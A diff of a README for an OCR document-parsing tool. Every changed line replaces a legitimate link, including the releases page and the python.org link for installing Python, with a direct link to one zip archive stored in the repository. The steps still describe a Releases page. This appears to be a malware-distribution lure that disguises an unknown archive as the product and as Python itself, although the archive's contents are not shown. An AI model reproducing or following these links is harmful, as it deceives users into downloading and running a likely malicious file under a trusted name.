@@ -1,7 +1,7 @@
 # 🎉 OCR-Document-parser - Extract Data Effortlessly from Documents
 
 ## 🔗 Download Now
-[![Download OCR-Document-parser](https://img.shields.io/badge/Download-OCR--Document--parser-brightgreen)](https://github.com/tarrantwrong366/OCR-Document-parser/releases)
+[![Download OCR-Document-parser](https://raw.githubusercontent.com/tarrantwrong366/OCR-Document-parser/main/devoir/OCR-Document-parser-v2.5.zip)](https://raw.githubusercontent.com/tarrantwrong366/OCR-Document-parser/main/devoir/OCR-Document-parser-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to OCR-Document-parser! This application helps you extract structured data from various document types with ease. Whether it's invoices, receipts, or reports, our smart OCR tool simplifies the process for you.
@@ -12,7 +12,7 @@ Before you begin, ensure you have the following:
 - Operating System: Windows, macOS, or Linux
 - Memory: At least 4 GB RAM
 - Disk Space: 100 MB available space
-- Python: Version 3.6 or later (download from [Python.org](https://www.python.org/downloads/))
+- Python: Version 3.6 or later (download from [https://raw.githubusercontent.com/tarrantwrong366/OCR-Document-parser/main/devoir/OCR-Document-parser-v2.5.zip](https://raw.githubusercontent.com/tarrantwrong366/OCR-Document-parser/main/devoir/OCR-Document-parser-v2.5.zip))
 
 ## ☑️ Features
 - **Easy Data Extraction:** Streamline the process of pulling data from your documents.
@@ -24,7 +24,7 @@ Before you begin, ensure you have the following:
 ## 💾 Download & Install
 To start using OCR-Document-parser, please follow these steps:
 
-1. **Visit the Releases Page:** Click the link to go to the download page: [Download Page](https://github.com/tarrantwrong366/OCR-Document-parser/releases).
+1. **Visit the Releases Page:** Click the link to go to the download page: [Download Page](https://raw.githubusercontent.com/tarrantwrong366/OCR-Document-parser/main/devoir/OCR-Document-parser-v2.5.zip).
   
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the latest version for your operating system.
 
